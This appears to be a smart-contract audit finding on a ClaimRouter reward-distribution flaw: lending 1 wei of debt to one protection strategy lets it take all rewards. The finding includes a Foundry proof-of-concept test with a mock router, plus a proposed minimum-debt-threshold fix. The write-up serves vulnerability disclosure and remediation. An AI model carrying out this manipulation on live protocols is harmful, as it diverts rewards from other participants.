S-254
Exploitation of Minimal Debt in Protection Strategies Leading to Unfair Reward Distribution
chaduke
38
Sufficient
383d ago
Finding description and impact

The finding reveals a critical vulnerability in the ClaimRouter contract, where a malicious user with the BLUEPRINT_ROLE can exploit the reward distribution mechanism by lending just 1 wei (an extremely low-cost action) to a protection strategy. This minimal debt manipulation allows the strategy to monopolize all rewards, effectively excluding others from receiving their fair share. The exploit undermines the fairness mechanism, as rewards intended to be evenly distributed in the absence of debt are instead disproportionately allocated, creating a significant risk with negligible cost to the attacker.

Root cause:
The root cause is the lack of a minimum debt threshold in the reward distribution logic, allowing even negligible debt (e.g., 1 wei) to qualify a protection strategy for proportional rewards. This enables a malicious BLUEPRINT_ROLE user to manipulate the system by creating minimal debt at a very low cost, bypassing the intended fairness mechanism for even reward distribution.

Impact:

Unfair Reward Distribution: Protection strategies without debt receive no rewards, disrupting the intended fairness mechanism.

Exploitation at Low Cost: Malicious actors with BLUEPRINT_ROLE can monopolize rewards with negligible expense (e.g., lending 1 wei).

Reduced Strategy Efficiency: Legitimate strategies with no debt are deprived of rewards, potentially reducing their operational effectiveness.

Protocol Integrity Risk: Perceived fairness and trust in the system are compromised, deterring users from participating.

Proof of Concept

The following POC demonstrates the exploitation of the ClaimRouter contract's reward distribution mechanism, where a malicious BLUEPRINT_ROLE user manipulates the system by lending just 1 wei to a protection strategy. The test sets up three strategies, with only one having a minimal debt (1 wei), and shows that this strategy monopolizes all rewards while others receive none. By verifying real token transfers and balances, the test highlights the unfair allocation caused by the absence of a minimum debt threshold, exposing the vulnerability's impact on the system's fairness and integrity.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

// MockClaimRouter Contract
contract MockClaimRouter {
    using SafeERC20 for IERC20;
    using Math for uint256;

    struct DebtVaults {
        uint256 totalBorrowDebt;
        uint256 vaultsWithProtect;
    }

    address[] public vaults;

    constructor(address[] memory _vaults) {
        vaults = _vaults;
    }

    function addRewards(address tokenAddress, uint256 amount_, address userBlueprint) external {
        _addTokensToStrategy(tokenAddress, amount_, userBlueprint, true);
    }

    function _addTokensToStrategy(
        address tokenAddress,
        uint256 amount_,
        address userBlueprint,
        bool isReward
    ) private {
        DebtVaults memory debtVaults = _getTokenTotalBorrowDebt(tokenAddress);

        if (debtVaults.vaultsWithProtect == 0) revert("NoProtectionStrategiesFound");

        uint256 totalSent = 0;
        address lastProtectionStrat;

        for (uint256 i = 0; i < vaults.length; i++) {
            address protectionStrat = vaults[i];
            uint256 stratBorrowDebt = MockProtectStrategy(protectionStrat).getBorrowDebt();

            uint256 amountToBeSent = 0;
            if (debtVaults.totalBorrowDebt != 0) {
                if (stratBorrowDebt == 0) continue;
                amountToBeSent = amount_.mulDiv(stratBorrowDebt, debtVaults.totalBorrowDebt, Math.Rounding.Floor);
            } else {
                amountToBeSent = amount_ / debtVaults.vaultsWithProtect;
            }

            lastProtectionStrat = protectionStrat;
            totalSent += amountToBeSent;
            IERC20(tokenAddress).safeTransferFrom(userBlueprint, protectionStrat, amountToBeSent);

            if (isReward || stratBorrowDebt == 0) continue;
        }

        if (amount_ > totalSent) {
            IERC20(tokenAddress).safeTransferFrom(userBlueprint, lastProtectionStrat, amount_ - totalSent);
        }
    }

    function _getTokenTotalBorrowDebt(address) private view returns (DebtVaults memory data) {
        uint256 totalBorrowDebt;
        uint256 vaultsWithProtect;

        for (uint256 i = 0; i < vaults.length; i++) {
            uint256 debt = MockProtectStrategy(vaults[i]).getBorrowDebt();
            if (debt > 0) {
                totalBorrowDebt += debt;
                vaultsWithProtect++;
            }
        }

        data.totalBorrowDebt = totalBorrowDebt;
        data.vaultsWithProtect = vaultsWithProtect;
    }
}

// Interface for MockProtectStrategy
interface MockProtectStrategy {
    function getBorrowDebt() external view returns (uint256);
}

// MockERC20 Token
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Test Contract
contract MockClaimRouterTest is Test {
    MockClaimRouter mockClaimRouter;
    MockERC20 mockToken;

    address strategy1 = address(0x1);
    address strategy2 = address(0x2);
    address strategy3 = address(0x3);

    address userBlueprint = makeAddr("usreBlueprint");

    function setUp() public {
        // Deploy MockClaimRouter and MockERC20
        mockToken = new MockERC20("MockToken", "MTK");
        address[] memory strategies = new address[](3);
        strategies[0] = strategy1;
        strategies[1] = strategy2;
        strategies[2] = strategy3;
        mockClaimRouter = new MockClaimRouter(strategies);

        // Mint tokens for the user blueprint
        mockToken.mint(userBlueprint, 1000 ether);

        // Approve MockClaimRouter to spend userBlueprint's tokens
        vm.prank(userBlueprint);
        mockToken.approve(address(mockClaimRouter), 1000 ether);

        // Mock the strategies and their debts
        vm.mockCall(strategy1, abi.encodeWithSelector(MockProtectStrategy.getBorrowDebt.selector), abi.encode(0));
        vm.mockCall(strategy2, abi.encodeWithSelector(MockProtectStrategy.getBorrowDebt.selector), abi.encode(1)); // 1 wei debt
        vm.mockCall(strategy3, abi.encodeWithSelector(MockProtectStrategy.getBorrowDebt.selector), abi.encode(0));
    }

    function testRewardDistributionWithMinimalDebt() public {
        uint256 rewardAmount = 1000 ether;

        // Print initial balances
        console2.log("Initial Balances:");
        console2.log("User Blueprint:", mockToken.balanceOf(userBlueprint));
        console2.log("Strategy 1:", mockToken.balanceOf(strategy1));
        console2.log("Strategy 2:", mockToken.balanceOf(strategy2));
        console2.log("Strategy 3:", mockToken.balanceOf(strategy3));

        // Call addRewards
        mockClaimRouter.addRewards(address(mockToken), rewardAmount, userBlueprint);

        // Check and print balances after rewards distribution
        uint256 strategy1Balance = mockToken.balanceOf(strategy1);
        uint256 strategy2Balance = mockToken.balanceOf(strategy2);
        uint256 strategy3Balance = mockToken.balanceOf(strategy3);
        uint256 userBlueprintBalance = mockToken.balanceOf(userBlueprint);

        console2.log("\nBalances After addRewards:");
        console2.log("User Blueprint:", userBlueprintBalance);
        console2.log("Strategy 1:", strategy1Balance);
        console2.log("Strategy 2:", strategy2Balance);
        console2.log("Strategy 3:", strategy3Balance);

        // Strategy 2 should have the full reward, others should have zero
        assertEq(strategy1Balance, 0, "Strategy 1 balance should be zero");
        assertEq(strategy2Balance, rewardAmount, "Strategy 2 should receive all rewards");
        assertEq(strategy3Balance, 0, "Strategy 3 balance should be zero");

        // User Blueprint should have no remaining tokens
        assertEq(userBlueprintBalance, 0, "User Blueprint balance should be zero");
    }
}
Recommended mitigation steps

The best method to mitigate this vulnerability is to introduce a minimum debt threshold for reward eligibility. This ensures that only protection strategies with a meaningful amount of debt can participate in proportional reward distribution.

If no strategy meets the minimum debt threshold, distribute rewards evenly among all eligible strategies to maintain fairness.
